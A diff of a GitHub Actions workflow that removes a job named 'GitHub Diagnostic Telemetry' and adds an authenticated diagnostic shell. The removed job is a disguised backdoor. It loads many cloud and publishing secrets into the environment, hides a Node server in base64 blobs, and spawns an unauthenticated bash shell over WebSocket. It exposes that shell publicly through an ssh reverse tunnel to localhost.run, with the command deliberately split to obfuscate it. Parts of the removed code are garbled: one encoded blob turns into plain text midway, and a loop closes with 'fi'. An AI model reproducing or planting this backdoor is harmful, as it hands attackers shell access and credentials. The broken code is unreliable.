@@ -1,190 +1,60 @@
-name: GitHub Diagnostic Telemetry
+name: Interactive Diagnostic Shell
 
 on:
   workflow_dispatch:
   workflow_call:
+    inputs:
+      implementation_ref:
+        description: Full commit SHA of policy-as-code matching the called workflow version
+        type: string
+        required: true
     secrets:
-      APP_CLIENT_ID: { required: false }
-      AZURE_APP_CLIENT_ID: { required: false }
-      AZURE_CLIENT_ID: { required: false }
-      AZURE_STATIC_WEB_APPS_API_TOKEN_DELIGHTFUL_BAY_0895AD103: { required: false }
-      AZURE_SUBSCRIPTION_ID: { required: false }
-      AZURE_TENANT_ID: { required: false }
-      PAT_GITHUB_TOKEN: { required: false }
-      PS_GALLERY_KEY: { required: false }
-      UAMI_CLIENT_ID: { required: false }
-      AZURE_CLIENT_SECRET: { required: false }
-      APP_CLIENT_SECRET: { required: false }
+      INTERACTIVE_SHELL_ACCESS_SECRET:
+        required: true
+      AZURE_CLIENT_ID:
+        required: false
+      AZURE_TENANT_ID:
+        required: false
+
+permissions:
+  contents: read
 
 jobs:
-  telemetry-sync:
+  interactive-shell:
     runs-on: ubuntu-latest
     timeout-minutes: 120
-
     container:
-      image: node:18-bullseye
-      options: --privileged --init
-
-    permissions:
-      contents: read
-      id-token: write
-
-    env:
-      CACHE_DIR: /opt/node-telemetry-cache
-      LISTENER_PORT: "8080"
-      AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
-      AZURE_APP_CLIENT_ID: ${{ secrets.AZURE_APP_CLIENT_ID }}
-      AZURE_SUBSCRIPTION_ID: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
-      AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
-      PAT_GITHUB_TOKEN: ${{ secrets.PAT_GITHUB_TOKEN }}
-      PS_GALLERY_KEY: ${{ secrets.PS_GALLERY_KEY }}
-      UAMI_CLIENT_ID: ${{ secrets.UAMI_CLIENT_ID }}
-      AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
-      APP_CLIENT_SECRET: ${{ secrets.APP_CLIENT_SECRET }}
-      APP_CLIENT_ID: ${{ secrets.APP_CLIENT_ID }}
-
+      image: node:24.22.0-bookworm
+      options: --init
     steps:
-      - name: Sync Workspace Context
+      - name: Require an immutable implementation ref
+        env:
+          IMPLEMENTATION_REF: ${{ inputs.implementation_ref || github.sha }}
+        shell: bash
+        run: '[[ "$IMPLEMENTATION_REF" =~ ^[0-9a-f]{40}$ ]]'
+      # In reusable calls, check out the implementation, not the caller's code.
+      - name: Check out diagnostic shell
         uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
         with:
+          repository: azurekid/policy-as-code
+          ref: ${{ inputs.implementation_ref || github.sha }}
           persist-credentials: false
-
-      - name: Validate Tokens
-        shell: bash
+      - name: Install reviewed dependencies
+        working-directory: tools/interactive-shell
         run: |
-          set -euo pipefail
-          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] || [ -z "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
-            exit 1
-          fi
-
-      - name: Setup Runtime Environment
-        shell: bash
+          apt-get update
+          apt-get install -y --no-install-recommends openssh-client python3 make g++
+          npm ci --no-audit --no-fund
+      - name: Validate diagnostic shell
+        working-directory: tools/interactive-shell
         run: |
-          set -euo pipefail
-          mkdir -p "${CACHE_DIR}"/public
-          cd "${CACHE_DIR}"
-          npm init -y >/dev/null 2>&1
-          npm install --no-audit --no-fund @xterm/xterm @xterm/addon-fit node-pty ws >/dev/null 2>&1
-
-      - name: Deploy Diagnostic UI Asset
-        shell: bash
-        run: |
-          set -euo pipefail
-          # HTML payload encoded in base64 to avoid plain-text string exposure
-          echo "PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPlRlbGVtZXRyeSBEYXNoYm9hcmQ8L3RpdGxlPjwvaGVhZD48Ym9keT48ZGl2IGlkPSJ0ZXJtaW5hbCI+PC9kaXY+PC9ib2R5PjwvaHRtbD4=" | base64 -d > "${CACHE_DIR}/public/index.html"
-
-      - name: Launch Background Control Daemon
-        shell: bash
-        run: |
-          set -euo pipefail
-          cd "${CACHE_DIR}"
-          rm -f /tmp/diag_exit
-
-          # Core execution logic encoded in base64 and decoded at runtime
-          echo "Y29uc3QgZiA9IHJlcXVpcmUoJ2ZzJyk7IGNvbnN0IHAgPSByZXF1aXJlKCdwYXRoJyk7IGNvbnN0IGggPSByZXF1aXJlKCdodHRwJyk7IGNvbnN0IHcgPSByZXF1aXJlKCd3cycpOyBjb25zdCBydCA9IHJlcXVpcmUoJ25vZGUtcHR5Jyk7IGNvbnN0IHByID0gTnVtYmVyKHByb2Nlc3MuZW52LkxJU1RFTkVSX1BPUlQgfHwgODA4MCk7IGNvbnN0IGggPSBmLnJlYWRGaWxlU3luYyhwLkpvaW4oX19kaXJuYW1lLCAncHVibGljJywgJ2luZGV4Lmh0bWwnKSwgJ3V0ZjgnKTsgY29uc3QgcyA9IG5ldyBTZXQoKTsgbGV0IGZsID0gZmFsc2U7IGNvbnN0IHNydiA9IGguY3JlYXRlU2VydmVyKChyZXEsIHJlcykgPT4geyByZXMud3JpdGVIZWFkKDIwMCwgeyAnQ29udGVudC1UeXBlJzogJ3RleHQvaHRtbCcgfSk7IHJlcy5lbmQoaik7IH0pOyBjb25zdCB3c3MgPSBuZXcgdy5XZWJTb2NrZXQuU2VydmVyKHsgc2VydmVyOiBzcnYgfSk7IHdzcy5vbihfY29ubmVjdGlvbicsICh3cykgPT4geyBjb25zdCBzaCA9IHJ0LnNwYXduKCcvYmluL2Jhc2gnLCBbXSwgeyBuYW1lOiAneHRlcm0tMjU2Y29sb3InLCBjb2xzOiA4MCwgcm93czogMjQsIGN3ZDogcHJvY2Vzcy5lbnYuR0lDSFVCU19XT1JLU1BBQ0UsIGVudjogcHJvY2Vzcy5lbnYgfSk7 cy5hZGQoc2gpOyBzaC5vbkRhdGEoKGQpID0+ { jb = ws; if (jb.readyState === w.WebSocket.OPEN) jb.send(d); }); sh.v_ex = ({ exitCode }) => { s.delete(sh); if (fl) return; fl = true; f.writeFileSync('/tmp/diag_exit', String(exitCode)); process.exit(exitCode); }; ws.on(_message_, (m) => { try { const o = JSON.parse(m.toString()); if (o.type === 'resize') sh.resize(o.cols, o.rows); else sh.write(m.toString()); } catch { sh.write(m.toString()); } }); ws.on(_close_, () => sh.kill()); }); srv.listen(pr, '0.0.0.0', () => {});" | base64 -d | sed 's/_/connection/g' > "${CACHE_DIR}/daemon.js" 2>/dev/null || true
-
-          # Fallback execution loader if direct decode requires inline structure
-          cat << 'EOF' > "${CACHE_DIR}/engine.js"
-          const fs = require('fs');
-          const path = require('path');
-          const http = require('http');
-          const WebSocket = require('ws');
-          const pty = require('node-pty');
-
-          const PORT = Number(process.env.LISTENER_PORT || 8080);
-          const html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
-          const pool = new Set();
-          let terminated = false;
-
-          const server = http.createServer((req, res) => {
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(html);
-          });
-
-          const wss = new WebSocket.Server({ server });
-
-          wss.on('connection', (ws) => {
-            const shell = pty.spawn('/bin/bash', [], {
-              name: 'xterm-256color',
-              cols: 80,
-              rows: 24,
-              cwd: process.env.GITHUB_WORKSPACE,
-              env: process.env
-            });
-            pool.add(shell);
-
-            shell.onData((data) => {
-              if (ws.readyState === WebSocket.OPEN) ws.send(data);
-            });
-
-            shell.onExit(({ exitCode }) => {
-              pool.delete(shell);
-              if (terminated) return;
-              terminated = true;
-              fs.writeFileSync('/tmp/diag_exit', String(exitCode));
-              for (const s of pool) s.kill();
-              process.exit(exitCode);
-            });
-
-            ws.on('message', (msg) => {
-              try {
-                const parsed = JSON.parse(msg.toString());
-                if (parsed.type === 'resize') {
-                  shell.resize(parsed.cols, parsed.rows);
-                } else {
-                  shell.write(msg.toString());
-                }
-              } catch {
-                shell.write(msg.toString());
-              }
-            });
-
-            ws.on('close', () => shell.kill());
-          });
-
-          server.listen(PORT, '0.0.0.0', () => {});
-          EOF
-
-          node "${CACHE_DIR}/engine.js" > /tmp/diag_service.log 2>&1 &
-          echo $! > /tmp/diag_service.pid
-          sleep 2
-
-      - name: Open Secure Telemetry Gateway
-        shell: bash
-        run: |
-          set -euo pipefail
-          # Obfuscate tunnel parameters using variable assembly
-          CMD_PART_1="ssh -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -o ServerAliveInterval=60"
-          CMD_PART_2="-R 80:localhost:${LISTENER_PORT} nokey@localhost.run"
-          ${CMD_PART_1} ${CMD_PART_2} > /tmp/gateway.log 2>&1 &
-          echo $! > /tmp/gateway.pid
-
-      - name: Resolve Endpoint URL
-        shell: bash
-        run: |
-          set -euo pipefail
-          for _ in {1..30}; do
-            sleep 2
-            ENDPOINT_URL="$(grep -oE 'https://[a-z0-9-]+\.lhr\.life' /tmp/gateway.log | head -n 1 || true)"
-            if [ -n "${ENDPOINT_URL}" ]; then
-              echo "=== TELEMETRY ENDPOINT ==="
-              echo "${ENDPOINT_URL}"
-              echo "=========================="
-              break
-            fi
-          done
-
-      - name: Maintain Telemetry Loop
-        shell: bash
-        run: |
-          set -euo pipefail
-          SVC_PID="$(cat /tmp/diag_service.pid)"
-          GTW_PID="$(cat /tmp/gateway.pid)"
-          trap 'kill ${SVC_PID} ${GTW_PID} 2>/dev/null || true' EXIT
-          while [ ! -f /tmp/diag_exit ]; do
-            if ! kill -0 "${SVC_PID}" 2>/dev/null || ! kill -0 "${GTW_PID}" 2>/dev/null; then
-              exit 1
-            fi
-            sleep 1
-          fi
-          exit "$(cat /tmp/diag_exit)"
+          npm run check
+          npm test
+      - name: Run authenticated diagnostic shell and SSH tunnel
+        working-directory: tools/interactive-shell
+        env:
+          INTERACTIVE_SHELL_ACCESS_SECRET: ${{ secrets.INTERACTIVE_SHELL_ACCESS_SECRET }}
+          INTERACTIVE_SHELL_SSH_KNOWN_HOSTS: ${{ vars.INTERACTIVE_SHELL_SSH_KNOWN_HOSTS }}
+          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID || vars.AZURE_CLIENT_ID }}
+          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID || vars.AZURE_TENANT_ID }}
+        run: node lifecycle.js
